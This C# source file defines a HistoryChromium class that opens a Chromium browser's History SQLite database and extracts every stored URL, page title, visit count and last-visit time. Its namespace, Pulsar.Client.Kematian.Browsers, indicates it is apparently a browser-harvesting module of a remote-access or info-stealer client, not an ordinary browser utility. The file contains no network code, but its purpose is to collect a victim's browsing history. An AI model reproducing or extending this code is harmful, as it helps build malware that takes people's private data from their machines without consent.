﻿using Pulsar.Client.Kematian.Browsers.Helpers.SQL;
using Pulsar.Client.Kematian.Browsers.Helpers.Structs;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;

namespace Pulsar.Client.Kematian.Browsers.Chromium.History
{
    public class HistoryChromium
    {
        public static List<HistoryData> GetHistoryChromium(string database)
        {
            var entries = new List<HistoryData>();

            if (File.Exists(database))
            {
                SQLiteHandler sqlDatabase;

                try
                {
                    sqlDatabase = new SQLiteHandler(database);
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Failed to open SQLite database: {ex.Message}");
                    return entries;
                }

                if (!sqlDatabase.ReadTable("urls"))
                {
                    Debug.WriteLine("Failed to read 'history' table from database.");
                    return entries;
                }

                for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
                {
                    try
                    {
                        var url = sqlDatabase.GetValue(i, "url");
                        var title = sqlDatabase.GetValue(i, "title");
                        var visitCount = sqlDatabase.GetValue(i, "visit_count");
                        var date = sqlDatabase.GetValue(i, "last_visit_time");

                        //edge seems to have some sites at 0 view count because of their sync shit
                        //if (visitCount == "0")
                        //    continue;

                        //Debug.WriteLine(visitCount);

                        entries.Add(new HistoryData(url, title, visitCount, date));
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Failed to retrieve History data from database: {ex.Message}");
                    }
                }
            }
            else
            {
                Debug.WriteLine("Database file not found.");
            }

            return entries;
        }
    }
}
